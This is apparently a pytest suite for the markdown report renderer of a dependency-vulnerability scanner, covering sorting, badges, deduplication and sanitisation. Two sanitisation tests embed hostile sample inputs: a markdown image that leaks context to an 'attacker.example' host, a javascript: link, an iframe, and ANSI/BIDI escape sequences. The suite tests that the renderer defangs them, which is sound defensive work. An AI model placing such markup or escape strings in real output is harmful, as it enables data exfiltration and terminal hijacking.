"""Tests for ``packages.sca.report``."""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

from packages.sca.findings import build_vuln_findings
from packages.sca.models import (
    AffectedRange,
    Advisory,
    CVSSScore,
    Confidence,
    Dependency,
    HygieneFinding,
    PinStyle,
)
from packages.sca.osv import OsvResult
from packages.sca.report import (
    render_markdown_report,
    write_markdown_report,
)


def _dep(name: str = "lodash", version: str = "4.17.20",
         direct: bool = True, scope: str = "main") -> Dependency:
    return Dependency(
        ecosystem="npm",
        name=name,
        version=version,
        declared_in=Path("/repo/package.json"),
        scope=scope,
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=direct,
        purl=f"pkg:npm/{name}@{version}",
        parser_confidence=Confidence("high", reason="t"),
    )


def _adv(osv_id: str = "GHSA-x", severity: str = "critical",
         score: float = 9.8) -> Advisory:
    return Advisory(
        osv_id=osv_id,
        aliases=["CVE-2099-9999"],
        summary="Test advisory summary.",
        details="Long detail block " * 60,
        affected=[AffectedRange(type="ECOSYSTEM",
                                events=[{"introduced": "0"}, {"fixed": "5"}])],
        severity=CVSSScore(score=score,
                           vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                           severity=severity),         # type: ignore[arg-type]
        fixed_versions=["5.0.0"],
        references=["https://example.com/", "https://other.example/"],
        published=datetime(2024, 1, 1, tzinfo=timezone.utc),
    )


def _hygiene(kind: str = "lockfile_drift",
             severity: str = "high") -> HygieneFinding:
    return HygieneFinding(
        finding_id=f"sca:hygiene:{kind}:npm:lodash:/repo/package.json",
        kind=kind,         # type: ignore[arg-type]
        dependency=_dep(),
        detail="manifest pins 4.17.20 but lockfile resolves 4.17.21",
        severity=severity,         # type: ignore[arg-type]
        confidence=Confidence("high", reason="exact pin disagrees"),
    )


# ---------------------------------------------------------------------------
# Rendering
# ---------------------------------------------------------------------------

def test_empty_report_states_no_findings(tmp_path: Path) -> None:
    md = render_markdown_report(
        target=tmp_path,
        deps_analysed=42,
        vuln_findings=[],
        hygiene_findings=[],
    )
    assert "No vulnerabilities" in md
    assert "Dependencies analysed: **42**" in md


def test_report_surfaces_parser_failures(tmp_path: Path) -> None:
    """Parser warnings (malformed pom.xml, broken Pipfile.lock,
    etc.) must show in report.md so operators don't mistake an
    empty result for a clean project. Section heading and
    per-failure bullets verified."""
    from packages.sca.parsers import ParseFailure

    md = render_markdown_report(
        target=tmp_path,
        deps_analysed=0,
        vuln_findings=[],
        hygiene_findings=[],
        parse_failures=[
            ParseFailure(
                path=tmp_path / "pom.xml",
                reason="mismatched tag: line 6, column 6",
            ),
            ParseFailure(
                path=tmp_path / "Pipfile.lock",
                reason="Expecting property name enclosed in double quotes",
            ),
        ],
    )
    assert "Parser warnings" in md
    assert "2 manifest(s) could not be parsed" in md
    assert "pom.xml" in md
    assert "Pipfile.lock" in md
    assert "mismatched tag" in md


def test_report_no_parser_section_when_no_failures(
    tmp_path: Path,
) -> None:
    """Default-empty ``parse_failures`` arg must not emit the
    warnings section — quiet output on the happy path."""
    md = render_markdown_report(
        target=tmp_path,
        deps_analysed=10,
        vuln_findings=[],
        hygiene_findings=[],
    )
    assert "Parser warnings" not in md


def test_report_includes_severity_table_and_kev_badge() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(dep_key=d.key(), advisories=[_adv()])],
    )
    findings[0].in_kev = True
    findings[0].epss = 0.97
    md = render_markdown_report(
        target=Path("/repo"),
        deps_analysed=10,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "## Summary" in md
    assert "| Critical | 1 |" in md
    assert "**KEV**" in md
    assert "EPSS 0.97" in md


def test_findings_are_sorted_by_severity_then_kev_then_epss() -> None:
    d_low = _dep(name="low-pkg")
    d_med = _dep(name="med-pkg")
    d_kev = _dep(name="kev-pkg")
    d_hi  = _dep(name="hi-pkg")
    findings = []
    findings.extend(build_vuln_findings(
        [d_low], [OsvResult(d_low.key(), [_adv("GHSA-l", "low", 3.0)])],
    ))
    findings.extend(build_vuln_findings(
        [d_med], [OsvResult(d_med.key(), [_adv("GHSA-m", "medium", 5.5)])],
    ))
    f_kev = build_vuln_findings(
        [d_kev], [OsvResult(d_kev.key(), [_adv("GHSA-k", "high", 7.5)])],
    )[0]
    f_kev.in_kev = True
    findings.append(f_kev)
    findings.extend(build_vuln_findings(
        [d_hi], [OsvResult(d_hi.key(), [_adv("GHSA-h", "high", 7.0)])],
    ))

    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=4,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    # KEV-tagged high comes before non-KEV high, both come before
    # medium and low.
    pos_kev = md.index("kev-pkg")
    pos_high = md.index("hi-pkg")
    pos_med = md.index("med-pkg")
    pos_low = md.index("low-pkg")
    assert pos_kev < pos_high < pos_med < pos_low


def test_long_advisory_detail_truncated() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "truncated; see findings.json" in md


def test_hygiene_section_rendered() -> None:
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=[],
        hygiene_findings=[_hygiene()],
    )
    assert "## Hygiene findings" in md
    assert "lockfile_drift" in md


def test_hygiene_detail_strips_autofetch_markup() -> None:
    """Supply-chain ``detail`` strings interpolate genuinely-untrusted
    content (npm install-hook script bodies, registry-supplied
    package names). Markdown autofetch markup like ``![](url)`` would
    auto-fire a fetch when an operator opens the rendered report —
    sanitise_string strips it. The same render path serves
    hygiene + supply-chain (``_render_one_kinded_group``)."""
    hostile = _hygiene()
    object.__setattr__(
        hostile, "detail",
        "lockfile drift! ![exfil](https://attacker.example/p?ctx=) "
        "[click](javascript:alert(1)) <iframe src='//evil/' />",
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=[],
        hygiene_findings=[hostile],
    )
    assert "lockfile drift!" in md
    assert "![" not in md, "autofetch markup must be defanged"
    assert "javascript:" not in md
    assert "<iframe" not in md


def test_hygiene_detail_escapes_terminal_injection() -> None:
    """ANSI / BIDI bytes in ``detail`` must not survive into the
    rendered report — ``cat report.md`` shouldn't be hijack-able."""
    hostile = _hygiene()
    object.__setattr__(
        hostile, "detail",
        "harmless\x1b[31mDANGER\x1b[0m ‮text",
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=[],
        hygiene_findings=[hostile],
    )
    assert "\x1b[" not in md
    assert "‮" not in md


def test_cache_stats_when_provided() -> None:
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=10,
        vuln_findings=[],
        hygiene_findings=[],
        cache_hits=8,
        cache_misses=2,
    )
    assert "8 hits / 2 misses" in md
    assert "80%" in md
    # Evictions absent when LRU didn't fire (None / zero).
    assert "memo evictions" not in md


def test_cache_evictions_surfaced_when_nonzero() -> None:
    """LRU evictions only render when ``> 0`` — a quiet "0 evictions"
    line would just be noise on small runs that don't fill the memo."""
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=10,
        vuln_findings=[],
        hygiene_findings=[],
        cache_hits=100,
        cache_misses=20,
        cache_evictions=42,
    )
    assert "42 memo evictions" in md


def test_cache_evictions_omitted_when_zero() -> None:
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=10,
        vuln_findings=[],
        hygiene_findings=[],
        cache_hits=100,
        cache_misses=20,
        cache_evictions=0,
    )
    assert "memo evictions" not in md


def test_build_stage_breakdown_omitted_for_single_scope() -> None:
    """Single-scope projects (the common case) shouldn't see a
    breakdown table — it would just duplicate the main severity
    summary with no extra info."""
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "Build-stage breakdown" not in md


def test_build_stage_breakdown_rendered_when_multi_stage() -> None:
    """Multi-stage Dockerfiles produce findings with distinct
    ``scope`` values (e.g. builder vs runtime). Render a per-stage
    table so operators triage runtime CVEs separately from
    build-only ones."""
    d_build = _dep(name="gcc", version="10.2.1", scope="builder")
    d_run = _dep(name="libc6", version="2.31", scope="runtime")
    findings = []
    findings.extend(build_vuln_findings(
        [d_build], [OsvResult(d_build.key(),
                              [_adv("GHSA-b", "high", 7.0)])],
    ))
    findings.extend(build_vuln_findings(
        [d_run], [OsvResult(d_run.key(),
                            [_adv("GHSA-r", "critical", 9.5)])],
    ))
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=2,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "### Build-stage breakdown" in md
    # Both stages appear with their finding counts.
    assert "`builder`" in md
    assert "`runtime`" in md


def test_finding_emphasises_non_main_scope_inline() -> None:
    """An individual finding from a non-main scope shows the scope
    in bold so operators can spot it during triage."""
    d = _dep(name="gcc", scope="builder")
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "scope: **`builder`** stage" in md


def test_finding_inline_main_scope_unchanged() -> None:
    """Default ``main`` scope keeps the legacy inline format —
    no visual emphasis."""
    d = _dep()  # scope="main" by default
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    assert "scope: main" in md
    assert "**`main`**" not in md


def test_build_stage_breakdown_kev_per_stage() -> None:
    """KEV badge counts per stage — so operators see "the runtime
    stage has 1 KEV finding" at a glance."""
    d_build = _dep(name="gcc", scope="builder")
    d_run = _dep(name="libc6", scope="runtime")
    findings = []
    findings.extend(build_vuln_findings(
        [d_build], [OsvResult(d_build.key(),
                              [_adv("GHSA-b", "high", 7.0)])],
    ))
    f_run = build_vuln_findings(
        [d_run], [OsvResult(d_run.key(),
                            [_adv("GHSA-r", "critical", 9.5)])],
    )
    f_run[0].in_kev = True
    findings.extend(f_run)
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=2,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    # The KEV column should show 1 on the runtime row, 0 on builder.
    assert "### Build-stage breakdown" in md
    # Find the runtime row line and verify it carries the KEV count.
    runtime_line = next(
        line for line in md.splitlines() if "`runtime`" in line
    )
    builder_line = next(
        line for line in md.splitlines() if "`builder`" in line
    )
    cells_runtime = [c.strip() for c in runtime_line.split("|") if c.strip()]
    cells_builder = [c.strip() for c in builder_line.split("|") if c.strip()]
    # Stage | Critical | High | Medium | Low | KEV | Total
    assert cells_runtime[5] == "1"   # KEV col
    assert cells_builder[5] == "0"


def test_no_emoji_or_red_green_indicators() -> None:
    """CLAUDE.md mandates no perspective-dependent colour glyphs."""
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=build_vuln_findings(
            [_dep()], [OsvResult(_dep().key(), [_adv()])],
        ),
        hygiene_findings=[_hygiene()],
    )
    for forbidden in ("🔴", "🟢"):
        assert forbidden not in md


def test_write_markdown_report_atomic(tmp_path: Path) -> None:
    out = tmp_path / "report.md"
    write_markdown_report(out, "# x\n")
    assert out.read_text() == "# x\n"
    assert all(p.suffix != ".tmp" for p in tmp_path.iterdir())


# ---------------------------------------------------------------------------
# Report-side dedup
# ---------------------------------------------------------------------------


def _supply_chain(kind: str = "version_publish",
                  declared_in: str = "/repo/package.json",
                  detail: str = "publish frequency outlier",
                  severity: str = "info",
                  evidence=None):
    """Build a SupplyChainFinding for dedup tests. Each fixture lets
    callers override ``declared_in`` to simulate the same dep being
    flagged in multiple manifests."""
    from packages.sca.models import SupplyChainFinding
    dep = Dependency(
        ecosystem="PyPI", name="requests", version="2.31.0",
        declared_in=Path(declared_in),
        scope="main", is_lockfile=False,
        pin_style=PinStyle.RANGE, direct=True,
        purl="pkg:pypi/[email protected]",
        parser_confidence=Confidence("high", reason="t"),
    )
    return SupplyChainFinding(
        finding_id=f"sca:supply_chain:{kind}:PyPI:requests:{declared_in}",
        kind=kind,                                         # type: ignore[arg-type]
        dependency=dep, detail=detail,
        evidence=evidence if evidence is not None else {},
        severity=severity,                                 # type: ignore[arg-type]
        confidence=Confidence("high", reason="t"),
    )


def test_supply_chain_same_kind_across_manifests_collapses_to_one_section() -> None:
    """Same (kind, dep, version) declared in 4 manifests → ONE
    section with a Sources list of 4 paths. Without dedup the
    report would carry 4 near-identical sections that drown the
    signal."""
    findings = [
        _supply_chain(declared_in=f"/repo/m{i}.txt") for i in range(4)
    ]
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=[], hygiene_findings=[],
        supply_chain_findings=findings,
    )
    assert md.count("### Info — version_publish: PyPI:requests") == 1
    assert "Sources (4):" in md
    for i in range(4):
        assert f"/repo/m{i}.txt" in md


def test_supply_chain_distinct_kinds_keep_separate_sections() -> None:
    """Different ``kind`` values for the same dep stay separate —
    they're different findings, not duplicates."""
    findings = [
        _supply_chain(kind="version_publish"),
        _supply_chain(kind="low_bus_factor", declared_in="/repo/other.txt"),
    ]
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=[], hygiene_findings=[],
        supply_chain_findings=findings,
    )
    assert "### Info — version_publish: PyPI:requests" in md
    assert "### Info — low_bus_factor: PyPI:requests" in md


def test_hygiene_dedup_uses_same_grouping():
    """Hygiene findings collapse on (kind, ecosystem, name, version),
    same as supply-chain. Verifies the shared helper covers both."""
    common = dict(
        ecosystem="npm", name="lodash", version="4.17.20",
        scope="main", is_lockfile=False,
        pin_style=PinStyle.RANGE, direct=True,
        purl="pkg:npm/[email protected]",
        parser_confidence=Confidence("high", reason="t"),
    )
    h_a = HygieneFinding(
        finding_id="sca:hygiene:loose_pin:npm:lodash:/repo/a.json",
        kind="loose_pin",                                  # type: ignore[arg-type]
        dependency=Dependency(declared_in=Path("/repo/a.json"), **common),
        detail="loose pin",
        severity="low",                                    # type: ignore[arg-type]
        confidence=Confidence("high", reason="t"),
    )
    h_b = HygieneFinding(
        finding_id="sca:hygiene:loose_pin:npm:lodash:/repo/b.json",
        kind="loose_pin",                                  # type: ignore[arg-type]
        dependency=Dependency(declared_in=Path("/repo/b.json"), **common),
        detail="loose pin",
        severity="low",                                    # type: ignore[arg-type]
        confidence=Confidence("high", reason="t"),
    )
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=[], hygiene_findings=[h_a, h_b],
    )
    assert md.count("### Low — loose_pin: npm:lodash") == 1
    assert "Sources (2):" in md
    assert "/repo/a.json" in md and "/repo/b.json" in md


def test_vuln_dedup_collapses_same_dep_same_advisory():
    """Same vulnerable dep at the same version flagged via the same
    advisory but declared in two manifests → one section, two
    sources. Without dedup we'd carry duplicate per-manifest
    sections that say the same thing about the same CVE."""
    d_a = _dep()
    d_a = Dependency(
        **{**d_a.__dict__, "declared_in": Path("/repo/a")},
    )
    d_b = Dependency(
        **{**d_a.__dict__, "declared_in": Path("/repo/b")},
    )
    adv = _adv("GHSA-X", "high", 7.5)
    findings = build_vuln_findings(
        [d_a, d_b],
        [OsvResult(d_a.key(), [adv]), OsvResult(d_b.key(), [adv])],
    )
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=2,
        vuln_findings=findings, hygiene_findings=[],
    )
    assert md.count("### High — lodash 4.17.20") == 1
    assert "Sources (2):" in md
    assert "/repo/a" in md and "/repo/b" in md


def test_vuln_distinct_advisories_stay_separate():
    """Same dep + version with TWO different advisories → two
    sections (one per CVE). Distinct CVEs are different findings."""
    d = _dep()
    adv_a = _adv("GHSA-A", "high", 7.5)
    adv_a.aliases = ["CVE-2099-AAAA"]                  # distinct CVE
    adv_b = _adv("GHSA-B", "medium", 5.5)
    adv_b.aliases = ["CVE-2099-BBBB"]                  # distinct CVE
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [adv_a, adv_b])],
    )
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=findings, hygiene_findings=[],
    )
    assert "GHSA-A" in md and "GHSA-B" in md


def test_single_source_section_unchanged():
    """A finding with one source must render identically to the
    pre-dedup output — no Sources list, just the original Source
    line. Ensures the dedup change doesn't churn output for
    operators on small projects with non-duplicating findings."""
    findings = [_supply_chain(declared_in="/repo/only.txt")]
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=[], hygiene_findings=[],
        supply_chain_findings=findings,
    )
    assert "Sources (" not in md
    assert "- Source: `/repo/only.txt`" in md


def test_dep_shared_lines_emitted_only_for_first_advisory() -> None:
    """Same (name, version) with N advisories should emit dep-level
    lines (Direct / Reachability / Version-match / Parser) only on
    the FIRST advisory section. Subsequent sections render compact
    — the operator already absorbed the dep context.

    Regression target: pre-fix django with 14 advisories repeated
    5 dep-level lines × 14 advisories = 70 lines of which 65 were
    redundant.
    """
    d = _dep()
    adv_a = _adv("GHSA-A", "high", 7.5)
    adv_a.aliases = ["CVE-2099-AAAA"]
    adv_b = _adv("GHSA-B", "high", 7.6)
    adv_b.aliases = ["CVE-2099-BBBB"]
    adv_c = _adv("GHSA-C", "medium", 5.5)
    adv_c.aliases = ["CVE-2099-CCCC"]
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [adv_a, adv_b, adv_c])],
    )
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=findings, hygiene_findings=[],
    )
    # The "Direct: yes" line should appear exactly ONCE — under the
    # first advisory — not once per advisory.
    assert md.count("- Direct: yes") == 1
    assert md.count("- Version match: high") == 1
    assert md.count("- Reachability:") == 1
    # Sanity: all three CVE sections are still in the report.
    assert "CVE-2099-AAAA" in md
    assert "CVE-2099-BBBB" in md
    assert "CVE-2099-CCCC" in md


def test_zero_epss_suppressed_in_badges() -> None:
    """``EPSS 0.00`` carries zero triage signal; suppress the
    badge so reports don't drown high-EPSS findings in low-EPSS
    visual noise. Threshold is 0.01 — anything that rounds to
    ``0.00`` is dropped."""
    d = _dep()
    adv = _adv("GHSA-low-epss", "high", 7.5)
    adv.aliases = ["CVE-2099-LOW"]
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    # Set epss=0.0 explicitly (build_vuln_findings doesn't populate
    # without a KEV/EPSS client).
    findings[0].epss = 0.0
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=findings, hygiene_findings=[],
    )
    assert "EPSS" not in md, "EPSS=0.0 should not appear as a badge"


def test_high_epss_still_shown() -> None:
    """Above-threshold EPSS still surfaces (regression guard for
    over-eager suppression)."""
    d = _dep()
    adv = _adv("GHSA-high-epss", "high", 7.5)
    adv.aliases = ["CVE-2099-HIGH"]
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    findings[0].epss = 0.42
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=findings, hygiene_findings=[],
    )
    assert "EPSS 0.42" in md


def test_references_prefer_advisory_pages_over_commits() -> None:
    """The pre-fix order surfaced commit URLs first because that's
    what OSV often returns first. Operators triaging want the
    advisory page (NVD / GHSA) — re-prioritise so commit URLs
    fall to the bottom and only the top 2 render."""
    d = _dep()
    adv = _adv("GHSA-ref-order", "high", 7.5)
    adv.aliases = ["CVE-2099-REF"]
    # Commits first (the noisy form); NVD buried at end.
    adv.references = [
        "https://github.com/foo/bar/commit/aaaaaaaa",
        "https://github.com/foo/bar/commit/bbbbbbbb",
        "https://github.com/foo/bar/commit/cccccccc",
        "https://nvd.nist.gov/vuln/detail/CVE-2099-REF",
    ]
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    md = render_markdown_report(
        target=Path("/x"), deps_analysed=1,
        vuln_findings=findings, hygiene_findings=[],
    )
    refs_line = next(
        (line for line in md.splitlines() if line.startswith("- References:")),
        None,
    )
    assert refs_line is not None
    # NVD must be present; at most one commit (we cap at 2 refs).
    assert "nvd.nist.gov" in refs_line
    commit_count = refs_line.count("/commit/")
    assert commit_count <= 1, refs_line


def test_advisory_text_with_ansi_or_bidi_is_sanitised() -> None:
    """OSV-supplied advisory text could carry ANSI escapes or BIDI
    overrides; the renderer must strip them so the markdown is safe to
    paste into terminals / chat / code review."""
    d = _dep()
    a = _adv()
    a.summary = "danger \x1b[31mred\x1b[0m and \u202emalicious\u202c text"
    a.details = "\x07line\u200b break"
    findings = build_vuln_findings([d], [OsvResult(d.key(), [a])])
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=findings,
        hygiene_findings=[],
    )
    # Raw escape bytes don't appear.
    assert "\x1b[" not in md
    assert "\u202e" not in md and "\u202c" not in md
    assert "\u200b" not in md
    assert "\x07" not in md
    # The visible text survives.
    assert "danger" in md and "red" in md and "malicious" in md


# ---------------------------------------------------------------------------
# Cross-detector escalation rationale
# ---------------------------------------------------------------------------

def test_supply_chain_escalation_reasons_rendered() -> None:
    """When supply_chain._escalate_cross_detector bumps severity it
    records why in evidence['escalation_reasons']; the report must
    surface that so the bumped severity isn't mysterious."""
    sc = _supply_chain(kind="slopsquat_suspect", severity="critical",
                       evidence={"escalation_reasons": [
                           "co-occurs with recent_publish + low_bus_factor "
                           "(LLM-hallucination-bait archetype)"
                       ]})
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=[],
        hygiene_findings=[],
        supply_chain_findings=[sc],
    )
    assert "Escalated:" in md
    assert "LLM-hallucination-bait archetype" in md


def test_supply_chain_without_escalation_has_no_escalated_bullet() -> None:
    sc = _supply_chain(kind="slopsquat_suspect", evidence={})
    md = render_markdown_report(
        target=Path("/x"),
        deps_analysed=1,
        vuln_findings=[],
        hygiene_findings=[],
        supply_chain_findings=[sc],
    )
    assert "Escalated:" not in md
